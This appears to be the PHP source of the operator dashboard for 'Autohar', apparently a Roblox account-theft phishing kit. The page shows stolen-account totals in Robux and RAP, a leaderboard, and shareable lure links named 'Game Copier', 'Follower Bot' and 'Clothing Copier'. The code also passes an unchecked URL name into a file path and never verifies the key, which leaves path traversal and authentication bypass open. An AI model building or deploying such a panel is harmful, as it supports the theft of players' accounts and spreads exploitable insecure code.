<?php
session_start();
require("include.php");
$name = $_SESSION['auth_name'] ?? $_GET["name"] ?? null; 
if (isset($_SESSION["auth_name"]) && !empty($_SESSION["auth_name"]) && isset($_SESSION["auth_key"]) && !empty($_SESSION["auth_key"])) {
    $data = json_decode(file_get_contents(__DIR__ . '/../auth/' . $name . '.json'), true);
} elseif (isset($_GET["key"]) && !empty($_GET["key"]) && isset($_GET["name"]) && !empty($_GET["name"])) {
    $data = json_decode(file_get_contents(__DIR__ . '/../auth/' . $name . '.json'), true);
    $_SESSION["auth_name"] = $_GET["name"];
    $_SESSION["auth_key"] = $_GET["key"];
} else {
    die(header("Location: /controller/create"));
};
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?=$setup["SiteName"];?> - Controller</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf/notyf.min.css">
    <script src="https://cdn.jsdelivr.net/npm/notyf/notyf.min.js"></script>
    <link rel="stylesheet" href="/css/dashboard.css?zxeno">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <script src="/js/dashboard.js" defer></script>
</head>
<body>
    <div class="container">
        <div class="logo">Controller</div>
        <p class="description">Control your personalized Autohar site here. simple management with fast results.</p>
        <div class="profile-container">
            <i class="fas fa-user-circle profile-icon"></i>
            <div class="profile-dropdown">
                <a href="logout" class="logout-btn">Logout</a>
            </div>
        </div>
        <div class="dashboard">
            <div class="panel">
                <h3>Stats</h3>
                <div class="leaderboard">
                    <div class="leader-item">
                        <div><span class="cookie-icon"></span>Total Robux</div>
                        <span><?=$data["robux"];?> R$</span>
                    </div>
                    <div class="leader-item">
                        <div><span class="cookie-icon"></span>Total Rap</div>
                        <span><?=$data["rap"];?> R$</span>
                    </div>
                    <div class="leader-item">
                        <div><span class="cookie-icon"></span>Total Summary</div>
                        <span><?=$data["summary"];?> R$</span>
                    </div>
                </div>
            </div>
            <div class="panel links-panel">
                <h3>Links</h3>
                <div class="leaderboard">
                    <div class="link-item">
                        <a>Game Copier</a>
                        <div class="link-input-wrapper">
                            <input type="text" class="autohar-link" value="https://<?=$_SERVER['HTTP_HOST'];?>/r/copier/<?=$name;?>" readonly />
                            <button class="copy-button">Copy</button>
                        </div>
                    </div>
                    <div class="link-item">
                        <a>Follower Bot</a>
                        <div class="link-input-wrapper">
                            <input type="text" class="autohar-link" value="https://<?=$_SERVER['HTTP_HOST'];?>/r/follower/<?=$name;?>" readonly />
                            <button class="copy-button">Copy</button>
                        </div>
                    </div>
                    <div class="link-item">
                        <a>Clothing Copier</a>
                        <div class="link-input-wrapper">
                            <input type="text" class="autohar-link" value="https://<?=$_SERVER['HTTP_HOST'];?>/r/clothing/<?=$name;?>" readonly />
                            <button class="copy-button">Copy</button>
                        </div>
                    </div>
                </div>
            </div>
            <div class="panel">
                <h3>Leaderboard</h3>
                <div class="leaderboard" id="leaderboard-container">

                </div>
            </div>
        </div>
        <div class="footer">
            <p>Want to explore more? <a href="<?=$setup['Discord'];?>">Join our Discord</a></p>
        </div>
    </div>
</body>
</html>